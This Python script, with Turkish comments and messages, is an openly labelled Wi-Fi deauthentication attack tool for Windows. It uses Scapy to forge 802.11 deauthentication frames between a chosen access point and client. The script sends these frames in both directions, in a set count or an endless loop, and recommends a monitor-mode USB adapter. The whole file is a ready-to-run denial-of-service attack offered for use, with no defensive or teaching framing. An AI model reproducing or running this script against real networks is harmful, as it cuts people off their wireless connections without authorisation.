# Deauthentication Attack Script - Windows Uyumlu
# Yonetici olarak calistirilmalidir. Npcap kurulu olmali.

import sys
import time
from scapy.all import *

# Windows yonetici yetkisi kontrolu
import ctypes
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    sys.exit("[-] Bu script yonetici olarak calistirilmalidir. Cmd'yi yonetici olarak acin.")

# Kullanim: python deauth.py "Wi-Fi" AA:BB:CC:DD:EE:FF FF:FF:FF:FF:FF:FF 500
if len(sys.argv) < 4:
    print("Kullanim: python deauth.py <arayuz> <hedef_bssid> <istemci_mac> [paket_sayisi] [neden_kodu]")
    print("Ornek: python deauth.py \"Wi-Fi\" AA:BB:CC:DD:EE:FF FF:FF:FF:FF:FF:FF 500")
    sys.exit(1)

INTERFACE = sys.argv[1]
TARGET_BSSID = sys.argv[2]
CLIENT_MAC = sys.argv[3]
COUNT = int(sys.argv[4]) if len(sys.argv) >= 5 else 0
REASON_CODE = int(sys.argv[5]) if len(sys.argv) >= 6 else 7

print(f"=== DEAUTH ATTACK SCRIPT (WINDOWS) ===")
print(f"Arayuz: {INTERFACE}")
print(f"Hedef BSSID: {TARGET_BSSID}")
print(f"Istemci MAC: {CLIENT_MAC}")
print(f"Paket sayisi: {COUNT if COUNT > 0 else 'sonsuz'}")
print(f"Neden kodu: {REASON_CODE}")
print(f"[*] Baslatiliyor...")

# Deauth cerceveleri olustur
# AP'den istemciye
dot11_ap = Dot11(type=0, subtype=12, addr1=CLIENT_MAC, addr2=TARGET_BSSID, addr3=TARGET_BSSID)
# Istemciden AP'ye
dot11_client = Dot11(type=0, subtype=12, addr1=TARGET_BSSID, addr2=CLIENT_MAC, addr3=TARGET_BSSID)

frame_body = Dot11Deauth(reason=REASON_CODE)

pkt_ap = RadioTap() / dot11_ap / frame_body
pkt_client = RadioTap() / dot11_client / frame_body

sent = 0
try:
    if COUNT == 0:
        while True:
            sendp(pkt_ap, iface=INTERFACE, verbose=0)
            sendp(pkt_client, iface=INTERFACE, verbose=0)
            sent += 2
            print(f"\r[+] Gonderilen paket: {sent}", end="", flush=True)
            time.sleep(0.1)
    else:
        for _ in range(COUNT):
            sendp(pkt_ap, iface=INTERFACE, verbose=0)
            sendp(pkt_client, iface=INTERFACE, verbose=0)
            sent += 2
            print(f"\r[+] Gonderilen paket: {sent}/{COUNT*2}", end="", flush=True)
            time.sleep(0.1)
except KeyboardInterrupt:
    print("\n[!] Kullanici tarafindan durduruldu.")
except OSError as e:
    print(f"\n[-] Hata: {e}")
    print("[!] Dahili Wi-Fi adaptoru monitor modu desteklemez. USB Wi-Fi adaptor gerekli.")
    print("[!] Ornek uyumlu adaptor: Alfa AWUS036ACH")
finally:
    print(f"\n[*] Toplam gonderilen paket: {sent}")